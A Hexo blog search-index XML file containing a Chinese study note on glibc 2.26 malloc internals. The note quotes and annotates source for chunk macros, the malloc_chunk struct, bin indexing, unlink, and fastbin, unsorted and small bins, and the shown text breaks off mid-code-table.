<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>glibc_malloc_srcCode(2.26)</title>
    <link href="/2021-08/pwn-glibc-malloc-srcCode/"/>
    <url>/2021-08/pwn-glibc-malloc-srcCode/</url>
    
    <content type="html"><![CDATA[<h1 id="基本数据结构及函数"><a href="#基本数据结构及函数" class="headerlink" title="基本数据结构及函数"></a>基本数据结构及函数</h1><h2 id="管理chunk"><a href="#管理chunk" class="headerlink" title="管理chunk"></a>管理chunk</h2><h3 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment checks and conversions</h3><p class="note note-info"><strong><u>MALLOC_ALIGNMENT</u></strong> 在 32 平台 chunk 地址按 8 字节对齐，64 位平台按 8 字节或是 16 字节对齐</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span><br><span class="hljs-meta">  ((unsigned long) (req) &gt;=                                                      \</span><br><span class="hljs-meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;                                    \</span><br><span class="hljs-meta">  (sz) = request2size (req);            \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (((sz) &lt; (req))                    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;                                    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);            \</span><br><span class="hljs-meta">      return 0;                            \</span><br><span class="hljs-meta">    &#125;                                    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk">malloc_chunk</a></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>Chunks always begin on even word boundaries, so the mem portion (which is returned to the user) is also on an even word boundary, and thus at least double-word <strong>aligned</strong>.</li></ul><h3 id="chunk-operations"><a href="#chunk-operations" class="headerlink" title="chunk operations"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1229">chunk operations</a></h3><p>没啥特别的, 如果有需要的话随时查找即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                              \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></td></tr></table></figure><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><h3 id="在malloc-state中的存储"><a href="#在malloc-state中的存储" class="headerlink" title="在malloc_state中的存储"></a>在malloc_state中的存储</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinsY[NFASTBINS];<br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="bin数组定位"><a href="#bin数组定位" class="headerlink" title="bin数组定位"></a>bin数组定位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist, */</span><span class="hljs-comment">/*Bin 1 is the unordered list*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))  </span><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></td></tr></table></figure><ul><li><p>bin_at的神奇操作: </p><ul><li>对外部而言, bin数组应该为128个, 输入的下标也是如此, 到了内部将其转换为该位置chunk的fd指针, 取地址”&amp;”, 转换为单字节指针char *, 然后减去chunk head的字节数, 变为该chunk的头部</li><li>除了外部下标到内部下标的转换, <strong>其余步骤相当于mem2chunk()的结果</strong> </li></ul></li><li><p>为什么是两个呢?</p><p>因为每个bin链在bins数组中存储的是一个fd指针和一个bk指针，即两个malloc chunk指针，所以要NBINS * 2<br>又因为数组bins中索引为0、1的指针是不使用的，所以要减去2</p><blockquote><p>例： bins[2]为unsorted bin链的fd成员，bin[3]为其bk成员, bin[0]为其presize, bin[1]为其size</p></blockquote><img src="https://i.loli.net/2021/08/11/sbzY4vrhU2wZypm.png" style="zoom: 33%;" /> </li></ul><h3 id="unlink：从bins中取出chunk"><a href="#unlink：从bins中取出chunk" class="headerlink" title="unlink：从bins中取出chunk"></a>unlink：从bins中取出chunk</h3><ul><li>2.25中为宏定义, 2.26为unlink_chunk函数, 仅仅多了一个检查<ul><li><code>if (chunksize (p) != prev_size (next_chunk (p)))  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code> </li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><span class="hljs-comment">//省略了每行末尾的反斜杠</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) </span><br>&#123; <span class="hljs-comment">//例子unlink(av, victim, bck, fwd)</span><br>    FD = P-&gt;fd;<span class="hljs-comment">//取出victim的fd和bk指针</span><br>    BK = P-&gt;bk;<br><span class="hljs-comment">//例行检查,实际上就是如果victim没有完整的在链表中的话就报错</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//如果正常的话</span><br>        FD-&gt;bk = BK;<br>        BK-&gt;fd = FD; <span class="hljs-comment">//取出了victim</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) <br>        &#123;<span class="hljs-comment">//如果在largebin里的链表 且 在chunk size链表里则需要额外设置fd_nextsize和bk_nextsize</span><br>            <span class="hljs-comment">//简单的检查, victim是不是 *完整的* 在chunk size链表</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//FD和victim同样大小</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)<span class="hljs-comment">//fd_nextsize等于自身只能说明链表里只有这个大小</span><br>                  <span class="hljs-comment">//现在就剩下FD(后面或许还有等大的)了, 修改一下chunk size链表</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<br>                <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//链表里还有其他的chunk</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;<br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;<br>                  &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//victim是一个单独的chunk</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>相关介绍和特点</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br>- 使用LIFO, 在链表头执行取出插入操作<br>- PREV_INUSE总为<span class="hljs-number">1</span>, 不会和相邻块进行合并<br>- chunk从不会在链表中间被删去, 只需要单向链表即可<br></code></pre></td></tr></table></figure><p><strong>indexing</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></td></tr></table></figure><ul><li>从fastbin_index方法也可以看出fastbin是将<strong>chunk大小</strong>转换为<strong>数据空间大小</strong>来index的, 从最短的8字节到80字节(默认64字节), 实际上支持(80 * SIZE_SZ / 4)字节</li></ul><p><strong>数量和容量</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-comment">//    DEFAULT_MXFAST     64 (for 32bit), 128 (for 64bit)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                                                      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br></code></pre></td></tr></table></figure><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="hljs-comment">//可能32为8, 64为16??</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ) <span class="hljs-comment">//暂时不知道这是做啥的, 一般为0</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) <span class="hljs-comment">//32:512  64:1024</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></td></tr></table></figure><ul><li><p>可以看到MIN_LARGE_SIZE用作了判断块大小是否位于small bin的范围内</p></li><li><p>small bin 紧跟在unsorted bin之后, 索引从2-??(自己想去), 所以index只需要移位就可以了, 相邻下标之间间隔0x10(64), 0x8(32)</p></li><li><p><strong>small bin和fast bin有一部分范围是重合的</strong> </p></li><li><p><strong>FIFO 链头插链尾入</strong> </p></li><li><p>small bin结构: 双向链表</p><p>待补充, 之前想错了</p></li></ul><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 